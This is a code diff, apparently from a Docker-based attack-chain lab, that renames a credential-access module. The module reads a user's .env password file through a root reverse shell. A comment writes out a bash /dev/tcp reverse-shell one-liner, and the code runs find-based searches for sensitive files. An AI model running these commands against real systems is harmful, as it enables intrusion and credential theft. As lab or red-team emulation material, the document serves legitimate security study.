@@ -6,14 +6,16 @@ import time
 from chainlog import log
 
 # =============================================================================
-# credential_stuffing.py — Discover internal credentials from john's .env
+# credential_access.py — Discover internal credentials from john's .env
 # MITRE ATT&CK:
 #   T1552.001 – Credentials In Files     (read john's ~/.env on apache)
 # -----------------------------------------------------------------------------
 # Runs FROM apache via the root reverse shell.
 # Searches for common sensitive file patterns (noise) then reads john's ~/.env
-# file to recover his password.  Network discovery and credential stuffing are
-# handled in lateral_movement.py.
+# file to recover his password.  This is Credential Access via credentials in
+# files — NOT credential stuffing.  The actual credential stuffing (reusing
+# john's recovered password across internal hosts, T1110.004) happens later in
+# lateral_movement.py.
 # =============================================================================
 
 ENV_FILE_PATH   = "/home/john.stravidis/.env"
@@ -52,7 +54,7 @@ def _run_remote(shell, cmd, timeout=10):
     """Send cmd through `shell`, return captured stdout up to a sentinel echo."""
     global _sentinel_seq
     _sentinel_seq += 1
-    sentinel = f"CS_SENTINEL_{_sentinel_seq:04X}_END"
+    sentinel = f"CA_SENTINEL_{_sentinel_seq:04X}_END"
 
     _drain(shell)
     shell.sendall(f"{cmd}\n".encode())
@@ -101,7 +103,7 @@ def _search_noise_files(shell):
     the root reverse shell echoes a PS1 prompt (and, on some shells, the
     command itself) into every `_run_remote` capture, so a plain emptiness
     check would treat that prompt noise as a hit and fire the `[?]` branch on
-    every pattern.  Only lines carrying the `CS_NOISE_HIT` marker count as
+    every pattern.  Only lines carrying the `CA_NOISE_HIT` marker count as
     real finds.
     """
     log("[*] Expanding credential search to common sensitive file patterns...")
@@ -110,13 +112,13 @@ def _search_noise_files(shell):
         search_dirs = " ".join(dirs)
         cmd = (
             f"find {search_dirs} -maxdepth 4 -name {shlex.quote(filename)} "
-            f"-printf 'CS_NOISE_HIT %p\\n' 2>/dev/null"
+            f"-printf 'CA_NOISE_HIT %p\\n' 2>/dev/null"
         )
         out = _run_remote(shell, cmd, timeout=10)
         hits = [
-            line[len("CS_NOISE_HIT "):]
+            line[len("CA_NOISE_HIT "):]
             for line in out.splitlines()
-            if line.startswith("CS_NOISE_HIT ")
+            if line.startswith("CA_NOISE_HIT ")
         ]
         if hits:
             any_hits = True
@@ -131,16 +133,17 @@ def _search_noise_files(shell):
 
 def run(root_shell, target_user=TARGET_USERNAME):
     """
-    Execute the credential-discovery step on apache via the root shell.
+    Execute the credential-access step on apache via the root shell.
 
     Searches for sensitive file patterns (noise) then reads john's .env file
-    to recover his password.  Network discovery and credential stuffing against
-    internal hosts are handled by the lateral movement step.
+    to recover his password (Credential Access, T1552.001).  Network discovery
+    and credential stuffing against internal hosts are handled later by the
+    lateral movement step.
 
     Returns a dict with:
         john_password — the password recovered from the env file (or None)
     """
-    log("\n[*] Starting credential discovery...")
+    log("\n[*] Starting credential access (credentials in files)...")
 
     # ------------------------------------------------------------------
     # Phase 1 — Credentials in files (T1552.001)
@@ -160,7 +163,7 @@ def run(root_shell, target_user=TARGET_USERNAME):
 
 
 # Test mode — same pattern as the other chain modules.
-# Usage: docker compose exec kali python3 /Attack-chain/credential_stuffing.py
+# Usage: docker compose exec kali python3 /Attack-chain/credential_access.py
 # Then in another terminal, on apache:
 #   docker exec apache bash -c 'bash -i >& /dev/tcp/10.10.0.2/5555 0>&1'
 if __name__ == "__main__":
